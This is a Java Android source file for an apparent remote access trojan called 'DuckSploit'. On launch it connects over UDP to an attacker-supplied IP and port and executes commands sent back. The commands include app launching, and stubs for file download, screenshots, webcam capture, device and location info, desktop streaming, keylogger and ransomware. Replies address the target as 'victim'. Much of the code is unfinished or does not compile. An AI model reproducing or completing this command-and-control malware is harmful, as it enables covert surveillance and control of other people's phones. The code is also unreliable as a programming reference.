package com.Duckpvp.DuckSploit.Horse;

import android.content.IntentFilter;
import android.graphics.Color;
import android.os.AsyncTask;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;
import android.os.StrictMode;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.text.Format;
import java.util.Enumeration;
import java.net.InetSocketAddress;
import java.util.Arrays;  
import java.nio.charset.StandardCharsets;
import java.io.*;
import java.io.FileOutputStream;
import android.content.Intent;


public class MainActivity extends AppCompatActivity {
    Handler mHandler;
    IntentFilter ifil;
	// TextView text;
	AsyncTask<?, ?, ?> runningTask;
	Intent launchIntent;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
		
		String messageStr = "Connected!";
		String receive = "null";
		String output = "";
		int server_port = 45357;
		StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
		StrictMode.setThreadPolicy(policy);
		try {
			DatagramSocket ds = new DatagramSocket();
			try {
				InetAddress local = InetAddress.getByName("<your ip>");
				try {
					ds.connect(new InetSocketAddress(local, server_port));
					messageStr = "Connected! ";
					int msg_length=messageStr.length();
					byte[] message = messageStr.getBytes();
					DatagramPacket p = new DatagramPacket(message, msg_length,local,server_port);
					
					try {
						ds.send(p);
						while (ds.isConnected())
						{
							try {
								byte[] buf = new byte[1024];
								DatagramPacket reply = new DatagramPacket(buf, buf.length);
								ds.receive(reply);
								receive = new String(reply.getData(), StandardCharsets.UTF_8);
								receive = receive.replace(System.lineSeparator(), "").replace("\r", "").replace("\n", "");
								String result2 = new String(receive).substring(0,9);
								result2 = result2.replaceAll("( )+", " ");
								String[] result = result2.split(" ");
								if(result.length != 0 && result[0].trim() != "" && result[0].trim() != " " && result[0].trim() != null)
								{
									if(result[0].trim().contains("download"))
									{
										if(result.length == 3)
										{
											String downloadurl = result[1].trim();
											String downloadpath = result[2].trim();
											
											
											
											
											
											
											output = "This file successfully downloaded to " + result[2].trim();
										}
										else
										{
											output = "Usage: download <url> <path>";
										}
		
									}
									else if (result[0].trim().contains("malware"))
									{
										if(result.length == 2)
										{
											if (result[1].trim().contains("keylogger"))
											{
												output = "soon!";
											}
											else if (result[1].trim().contains("--help"))
											{
												output = "";
											}
											else if (result[1].trim().contains("ransomware"))
											{
												output = "soon!";
											}
											else
											{
												output = "Arg not found!";
											}
										}
										else
										{
											output = "malware --help to get malware list";
										}
									}
									else if (result[0].trim().contains("screenshot"))
									{
										output = "A screenshot appears at http://<victim ip>/screenshots";
									}
									else if (result[0].trim().contains("webcam_snap"))
									{
										output = "Webcam snap taken! ";
									}
									else if (result[0].trim().contains("open"))
									{
										if(result.length == 2)
										{
											Intent launchIntent = getPackageManager().getLaunchIntentForPackage(result[1].trim());
											startActivity( launchIntent );
											output = result[1].trim() + " has been started!";
										}
										else
										{
											output = "Usage: open <package>, to start selected package";
										}
									}
									else if (result[0].trim().contains("info"))
									{
										String ipv4 = "0.0.0.0";
										String username = "0.0.0.0";
										String ipv6 = "0.0.0.0";
										String hostname = "0.0.0.0";
										String ssid = "0.0.0.0";
										
										String line1 = "Username: " + username;
										String line2 = "IPV4: " + ipv4;
										String line3 = "IPV6: " + ipv6;
										String line4 = "HostName: " + hostname;
										String line5 = "Network SSID: " + ssid;
										String line6 = "Latitude: ";
										String line7 = "Longitude: ";
										String jumpline = "\n";
										output = line1 + jumpline + line2 + jumpline + line3 + jumpline + line4 + jumpline + line5 + jumpline + line6 + jumpline + line7;
									}
									else if (result[0].trim().contains("network_info"))
									{
										output = "net infos";
									}
									else if (result[0].trim().contains("skull"))
									{
										output = "A scary Skull with crossbones spawned! ";
									}
									else if (result[0].trim().contains("get_app_list"))
									{
										// PackageManager pm;
										// pm = getPackageManager();
										//  get a list of installed apps.
										// output = pm.getInstalledApplications(0);
									}
									else if (result[0].trim().contains("rickroll"))
									{
										output = "Victim just get rickrolled";
										// execute_cmd("start https://www.youtube.com/watch?v=dQw4w9WgXcQ");
									}
									else if (result[0].trim().contains("uninstall"))
									{
										output = "[o] Ds is now uninstalled from victim's computer! ";
										break;
									}
									else if (result[0].trim().contains("msg"))
									{
										if(result.length == 4)
										{
											output = "Sended message!";
										}
										else
										{
											output = "Usage: msg <title> <line1> <line2>!";
										}
									}
									else if (result[0].trim().contains("notif"))
									{
										if(result.length == 3)
										{
											NotificationCompat.Builder builder = new NotificationCompat.Builder(this, CHANNEL_ID)
													.setSmallIcon(R.drawable.ic_launcher)
													.setContentTitle(result[1].trim())
													.setContentText(result[2].trim())
													.setPriority(NotificationCompat.PRIORITY_DEFAULT);

										}
										else
										{
											output = "Usage: notif <title> <message>";
										}
									}
									else if (result[0].trim().contains("desktop_stream"))
									{
										if(result.length == 2)
										{
											if (result[1].trim().contains("start"))
											{
												output = "Desktop stream started at <victim IP>/desktop_stream.html";
											}
											else if (result[1].trim().contains("stop"))
											{
												output = "Desktop Stream successfully shuted down! ";
											}
										}else{
											output = "Usage: desktop_stream <start/stop>";
										}
									}
									else if (result[0].trim().contains("host"))
									{
										try{
											if (result[1].trim().contains("start"))
											{
												output = "Hosting system started!";
											}
											else if (result[1].trim().contains("stop"))
											{
												output = "Hosting system stopped!";
											}
											else
											{
												output = "Usage: host <start/stop>";
											}
										}catch (Exception e ) {
											output = "Usage: host <start/stop>";
										}
									}
									else
									{
										output = "Unknown command \"" + result[0].trim() + "\"";
									}
									// output = result[0].trim();
									// output = "\n" + output + "\n";
									msg_length=output.length();
									message = output.getBytes();
									p = new DatagramPacket(message, msg_length,local,server_port);
									ds.send(p);
								}
								else
								{}
							} catch (Exception e) {
								Toast.makeText(MainActivity.this, e.toString(), Toast.LENGTH_LONG).show();
								this.finishAffinity();
							}
						}
						Toast.makeText(MainActivity.this, "Disconnected!", Toast.LENGTH_LONG).show();
						this.finishAffinity();
					} catch (IOException e) {
						Toast.makeText(MainActivity.this, e.toString(), Toast.LENGTH_LONG).show();
						this.finishAffinity();
					}
				} catch (SocketException connectException) {
					Toast.makeText(MainActivity.this, "Error!", Toast.LENGTH_LONG).show();
					this.finishAffinity();
				}
			} catch (UnknownHostException e) {
				Toast.makeText(MainActivity.this, e.toString(), Toast.LENGTH_LONG).show();
				this.finishAffinity();
			}
		} catch (SocketException e) {
			Toast.makeText(MainActivity.this, e.toString(), Toast.LENGTH_LONG).show();
			this.finishAffinity();
		}
		
		mHandler = new Handler(Looper.getMainLooper()){
			@Override
			public void handleMessage(Message msg) {
				// TODO Auto-generated method stub
				super.handleMessage(msg);
				switch(msg.what)
				{
					case 1:
					Toast.makeText(getApplicationContext(), "Timer Expired", Toast.LENGTH_LONG).show();


				}

			}
		};
    }
	public void send_output(String msg)
	{
		int server_port = 45357;
		try {
			DatagramSocket ds = new DatagramSocket();
			try {
				InetAddress local = InetAddress.getByName("192.168.1.46");
				int msg_length=msg.length();
				byte[] message = msg.getBytes();
				DatagramPacket p = new DatagramPacket(message, msg_length,local,server_port);
				try {
					ds.send(p);
				} catch (IOException e) {
					Toast.makeText(MainActivity.this, e.toString(), Toast.LENGTH_LONG).show();
					this.finishAffinity();
				}
			} catch (UnknownHostException e) {
				Toast.makeText(MainActivity.this, e.toString(), Toast.LENGTH_LONG).show();
				this.finishAffinity();
			}
		} catch (SocketException e) {
			Toast.makeText(MainActivity.this, e.toString(), Toast.LENGTH_LONG).show();
			this.finishAffinity();
		}
	}
}
